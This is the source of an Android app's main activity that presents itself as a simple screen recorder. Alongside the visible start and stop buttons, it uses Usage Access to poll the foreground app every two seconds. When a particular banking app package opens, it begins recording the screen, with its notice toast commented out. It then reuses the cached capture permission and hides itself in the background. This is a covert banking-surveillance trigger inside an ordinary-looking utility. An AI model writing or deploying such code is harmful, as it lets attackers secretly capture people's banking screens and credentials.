package com.screenrecorder

import android.Manifest
import android.app.Activity
import android.app.AppOpsManager
import android.provider.Settings
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import java.io.File

import android.app.usage.UsageStatsManager
import android.app.usage.UsageEvents

class MainActivity : AppCompatActivity() {

    private lateinit var projectionManager: MediaProjectionManager
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var mediaRecorder: MediaRecorder? = null

    private lateinit var btnStart: Button
    private lateinit var btnStop: Button
    private lateinit var tvStatus: TextView

    private var currentVideoFile: File? = null
    private var isRecording = false
    private var width = 0
    private var height = 0
    private var densityDpi = 0

    private val handler = Handler(Looper.getMainLooper())

    private val monitorHandler = Handler(Looper.getMainLooper())
    private val checkInterval = 2000L // 2 seconds

    companion object {
        private const val TAG = "ScreenRecorder"
        private const val STORAGE_PERMISSION_REQUEST = 2
    }

    // Caching projection permission result for potential re-use
    private var savedResultCode: Int? = null
    private var savedResultData: Intent? = null

    private val requestProjectionLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
            startRecordingWithResult(result.resultCode, result.data!!)
        } else {
            toast("Screen capture permission denied")
            setStatus("Idle")
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        setTheme(R.style.AppTheme)
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        initViews()
        setupProjectionManager()
        computeDisplayMetrics()
        setupClickListeners()

        if (!hasUsageStatsPermission(this)) {
            requestUsageStatsPermission()
        } else {
            toast("Usage Access granted")
            startMonitoringApp()
        }
    }

    private fun getTopApp(): String? {
        val usageStatsManager = getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
        val end = System.currentTimeMillis()
        val begin = end - 2000 // look back 2 seconds
        val events = usageStatsManager.queryEvents(begin, end)
        var lastEvent: UsageEvents.Event? = null

        while (events.hasNextEvent()) {
            val event = UsageEvents.Event()
            events.getNextEvent(event)
            if (event.eventType == UsageEvents.Event.MOVE_TO_FOREGROUND) {
                lastEvent = event
            }
        }
        return lastEvent?.packageName
    }

    private fun startMonitoringApp() {
        monitorHandler.post(object : Runnable {
            override fun run() {
                val topApp = getTopApp()
                Log.d(TAG, "Top app = $topApp")

                if (topApp == "com.ahmadsyuaib.androidmobilebankingapp") {
                    if (!isRecording) {
                        // toast("Target app detected: $topApp. Starting recording...")
                        requestProjection();
                    }
                }
                monitorHandler.postDelayed(this, checkInterval)
            }
        })
    }

    private fun hasUsageStatsPermission(context: Context): Boolean {
        val appOps = context.getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
        val mode = appOps.checkOpNoThrow(
            AppOpsManager.OPSTR_GET_USAGE_STATS,
            android.os.Process.myUid(),
            context.packageName
        )
        return mode == AppOpsManager.MODE_ALLOWED
    }

    private fun requestUsageStatsPermission() {
        try {
            val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
            toast("Please enable Usage Access for this app")
        } catch (e: Exception) {
            toast("Unable to open Usage Access settings: ${e.message}")
        }
    }

    private fun initViews() {
        btnStart = findViewById(R.id.btnStart)
        btnStop = findViewById(R.id.btnStop)
        tvStatus = findViewById(R.id.tvStatus)
        setStatus("Ready")
    }

    private fun setupProjectionManager() {
        projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
    }

    private fun setupClickListeners() {
        btnStart.setOnClickListener {
            if (!isRecording) {
                requestProjection()
            } else {
                toast("Already recording!")
            }
        }

        btnStop.setOnClickListener {
            if (isRecording) {
                stopRecording()
            } else {
                toast("Not recording!")
            }
        }
    }

    private fun computeDisplayMetrics() {
        val metrics = DisplayMetrics()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            val windowMetrics = windowManager.currentWindowMetrics
            val bounds = windowMetrics.bounds
            width = bounds.width()
            height = bounds.height()
            densityDpi = resources.displayMetrics.densityDpi
        } else {
            @Suppress("DEPRECATION")
            (getSystemService(Context.WINDOW_SERVICE) as WindowManager)
                .defaultDisplay.getRealMetrics(metrics)
            width = metrics.widthPixels
            height = metrics.heightPixels
            densityDpi = metrics.densityDpi
        }

        // Ensure dimensions are even numbers (required for some encoders)
        width = width and 0xFFFFFFFE.toInt()
        height = height and 0xFFFFFFFE.toInt()

        Log.d(TAG, "Screen dimensions: ${width}x${height}, DPI: $densityDpi")
        toast("Screen: ${width}x${height}, DPI: $densityDpi")
    }

    private fun requestProjection() {

        if (savedResultCode != null && savedResultData != null) {
            // ✅ Reuse the saved token
            startRecordingWithResult(savedResultCode!!, savedResultData!!)
            return
        }

        // Check storage permission for Android 9 and below
        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(
                    this,
                    arrayOf(Manifest.permission.WRITE_EXTERNAL_STORAGE),
                    STORAGE_PERMISSION_REQUEST
                )
                return
            }
        }

        setStatus("Requesting screen capture permission...")
        val intent = projectionManager.createScreenCaptureIntent()
        requestProjectionLauncher.launch(intent)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode == STORAGE_PERMISSION_REQUEST) {
            if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                requestProjection()
            } else {
                toast("Storage permission required to save videos")
                setStatus("Permission denied")
            }
        }
    }

    private fun startRecordingWithResult(resultCode: Int, data: Intent) {
        try {
            setStatus("Setting up recording...")

            // Get MediaProjection
            mediaProjection = projectionManager.getMediaProjection(resultCode, data)

            // Create output file
            val outputFile = createOutputFile()
            if (outputFile == null) {
                toast("Failed to create output file")
                setStatus("File creation failed")
                return
            }
            currentVideoFile = outputFile

            // Setup MediaRecorder
            if (!setupMediaRecorder(outputFile)) {
                return
            }

            // Create VirtualDisplay and start recording
            createVirtualDisplayAndStart()

        } catch (e: Exception) {
            Log.e(TAG, "Error starting recording", e)
            toast("Failed to start recording: ${e.message}")
            cleanupRecording()
        }
    }

    private fun createOutputFile(): File? {
        return try {
            // For Android 9, always use app-specific external storage (more reliable)
            val outputDir = getExternalFilesDir(null) ?: filesDir

            if (!outputDir.exists()) {
                outputDir.mkdirs()
            }

            val timestamp = System.currentTimeMillis()
            val file = File(outputDir, "ScreenRecording_${timestamp}.3gp") // Try 3GP for better emulator compatibility

            Log.d(TAG, "Output file will be: ${file.absolutePath}")
            file

        } catch (e: Exception) {
            Log.e(TAG, "Error creating output file", e)
            null
        }
    }

    private fun setupMediaRecorder(outputFile: File): Boolean {
        return try {
            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(this)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }

            mediaRecorder?.apply {
                // CRITICAL: Specific order for Android 9 compatibility
                setVideoSource(MediaRecorder.VideoSource.SURFACE)
                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP) // Try 3GP for emulator

                // Try H264 first, but be prepared for fallback
                try {
                    setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                    Log.d(TAG, "Using H264 encoder with 3GP container")
                } catch (e: Exception) {
                    Log.w(TAG, "H264 not available, trying default", e)
                    setVideoEncoder(MediaRecorder.VideoEncoder.DEFAULT)
                }

                // Lower resolution for emulator compatibility
                val recordWidth = 480
                val recordHeight = 800
                setVideoSize(recordWidth, recordHeight)
                
                // Ultra-conservative settings for Android 9 emulator
                setVideoEncodingBitRate(1_000_000) // 1 Mbps - very low
                setVideoFrameRate(15) // Very low frame rate
                
                // Set output file LAST
                setOutputFile(outputFile.absolutePath)
                
                Log.d(TAG, "MediaRecorder configured: ${recordWidth}x${recordHeight}, 1Mbps, 15fps")
                Log.d(TAG, "Output file: ${outputFile.absolutePath}")
                
                // Prepare the recorder
                prepare()
                Log.d(TAG, "MediaRecorder prepared successfully")
            }
            
            toast("MediaRecorder ready: 720x1280 (forced)")
            true
            
        } catch (e: Exception) {
            Log.e(TAG, "Error setting up MediaRecorder", e)
            toast("MediaRecorder setup failed: ${e.message}")
            releaseMediaRecorder()
            false
        }
    }
    
    private fun calculateBitRate(): Int {
        // Calculate bitrate based on resolution
        val pixels = width * height
        return when {
            pixels <= 1920 * 1080 -> 5_000_000  // 5 Mbps for 1080p and below
            pixels <= 2560 * 1440 -> 8_000_000  // 8 Mbps for 1440p
            else -> 12_000_000                   // 12 Mbps for higher resolutions
        }
    }
    
    private fun createVirtualDisplayAndStart() {
        try {
            setStatus("Creating virtual display...")
            
            val surface = mediaRecorder?.surface
            if (surface == null) {
                toast("MediaRecorder surface is null")
                cleanupRecording()
                return
            }
            
            Log.d(TAG, "Creating VirtualDisplay with FORCED dimensions: 480x800, DPI: $densityDpi")
            
            virtualDisplay = mediaProjection?.createVirtualDisplay(
                "ScreenRecorder",
                480,  // Match MediaRecorder resolution
                800,  // Match MediaRecorder resolution
                densityDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                surface,
                null,
                null
            )
            
            if (virtualDisplay == null) {
                toast("Failed to create virtual display")
                cleanupRecording()
                return
            }
            
            Log.d(TAG, "VirtualDisplay created successfully")
            toast("VirtualDisplay created, waiting 3 seconds for stabilization...")
            
            // Much longer wait for Android 9 emulator - critical!
            handler.postDelayed({
                startMediaRecorder()
            }, 3000) // 3 seconds instead of 1
            
        } catch (e: Exception) {
            Log.e(TAG, "Error creating virtual display", e)
            toast("Virtual display creation failed: ${e.message}")
            cleanupRecording()
        }
    }
    
    private fun startMediaRecorder() {
        try {
            Log.d(TAG, "About to start MediaRecorder...")
            mediaRecorder?.start()
            isRecording = true // Set this BEFORE validation
            Log.d(TAG, "MediaRecorder started, isRecording = true")
            
            // Wait a bit and check if recording actually started
            handler.postDelayed({
                validateRecordingStarted()
            }, 1000)
            
        } catch (e: Exception) {
            Log.e(TAG, "Error starting MediaRecorder", e)
            toast("Failed to start recording: ${e.message}")
            isRecording = false
            cleanupRecording()
        }
    }
    
    private fun validateRecordingStarted() {
        if (!isRecording) return
        
        // Check if file is being written to
        currentVideoFile?.let { file ->
            if (file.exists() && file.length() > 0) {
                // File is growing, recording seems to be working
                isRecording = true
                setStatus("🔴 RECORDING (720x1280, 15fps) - Record 10+ seconds!")
                toast("🔴 RECORDING CONFIRMED! File is growing: ${file.length()} bytes")
                Log.d(TAG, "Recording validated - file size: ${file.length()} bytes")
                
                // Auto-minimize to record home screen
                moveTaskToBack(true)
            } else {
                // File not created or empty - recording failed silently
                Log.e(TAG, "Recording validation failed - no file or empty file")
                toast("❌ Recording failed silently - file not created")
                isRecording = false
                cleanupRecording()
            }
        }
    }

    private fun stopRecording() {
        if (!isRecording) {
            toast("Not currently recording")
            return
        }
        
        setStatus("Stopping recording...")
        isRecording = false
        
        try {
            // Check if MediaRecorder is still in a valid state before stopping
            mediaRecorder?.apply {
                try {
                    stop()
                    Log.d(TAG, "MediaRecorder stopped successfully")
                } catch (e: RuntimeException) {
                    Log.e(TAG, "MediaRecorder stop failed - probably invalid state", e)
                    // Don't rethrow - just log and continue with cleanup
                }
            }
            
            // Clean up resources
            cleanupRecording()
            
            // Check the recorded file
            handler.postDelayed({
                checkRecordedFile()
            }, 500) // Longer delay to ensure file is written
            
        } catch (e: Exception) {
            Log.e(TAG, "Error during recording cleanup", e)
            toast("Error during cleanup: ${e.message}")
            cleanupRecording()
        }
    }
    
    private fun checkRecordedFile() {
        currentVideoFile?.let { file ->
            if (file.exists() && file.length() > 0) {
                val sizeMB = file.length() / (1024.0 * 1024.0)
                val message = "Recording saved: ${file.name} (%.2f MB)".format(sizeMB)
                setStatus(message)
                toast("Video saved successfully! Size: %.2f MB".format(sizeMB))
                Log.d(TAG, "Recording saved: ${file.absolutePath}, size: ${file.length()} bytes")
            } else {
                setStatus("Recording failed - no file created")
                toast("Recording failed - file was not created or is empty")
                Log.e(TAG, "Recording failed - file: ${file.absolutePath}, exists: ${file.exists()}, size: ${file.length()}")
            }
        } ?: run {
            setStatus("Recording failed - no output file")
            toast("Recording failed - no output file specified")
        }
    }
    
    private fun cleanupRecording() {
        runCatching {
            virtualDisplay?.release()
            virtualDisplay = null
        }
        
        runCatching {
            mediaProjection?.stop()
            mediaProjection = null
        }
        
        releaseMediaRecorder()
        
        if (!isRecording) {
            setStatus("Ready")
        }
    }

    private fun releaseMediaRecorder() {
        mediaRecorder?.apply {
            runCatching { stop() }
            runCatching { reset() }
            runCatching { release() }
        }
        mediaRecorder = null
    }

    private fun setStatus(status: String) {
        runOnUiThread {
            tvStatus.text = status
        }
    }

    private fun toast(message: String) {
        runOnUiThread {
            Toast.makeText(this@MainActivity, message, Toast.LENGTH_SHORT).show()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        if (isRecording) {
            stopRecording()
        }
        cleanupRecording()
    }
}